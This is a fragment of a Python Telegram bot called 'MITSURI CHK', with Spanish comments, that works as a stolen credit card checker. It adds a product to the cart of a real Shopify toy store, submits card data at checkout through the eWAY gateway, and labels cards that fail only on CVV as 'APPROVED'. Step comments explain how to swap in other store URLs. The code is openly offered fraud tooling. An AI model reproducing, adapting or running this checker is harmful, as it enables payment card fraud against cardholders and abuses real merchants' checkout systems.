...
@Client.on_message(filters.command("na", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
<b>あ MITSURI CHK あ
ESTADO: <code>ON</code>
GATEWAY: <code>NASHE</code>
PASARELA: <code>SHOPIFY + EWAY $20.98</code> </b>""")
...
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}""")
        ...
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '41665048084612'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://www.toyworld.com.au/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.toyworld.com.au/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.toyworld.com.au"
        }
        ...
        elif "CVV Validation Error  Failed," in resp:
                    msg = "APPROVED ✅"
                    respuesta = resp
...
<b>MITSURI CHK - SH + EWAY $20.98 USD</b>
